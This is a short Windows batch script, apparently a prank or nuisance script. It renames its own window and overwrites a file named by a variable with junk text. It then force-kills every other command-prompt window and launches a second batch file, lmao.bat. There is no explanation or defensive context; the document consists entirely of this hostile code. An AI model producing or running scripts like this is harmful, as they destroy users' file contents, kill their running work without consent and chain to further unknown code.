title idkhelp
echo initcopy >%filename%
taskkill /f /fi "windowtitle ne idkhelp*" /im cmd.exe
start lmao.bat
exit
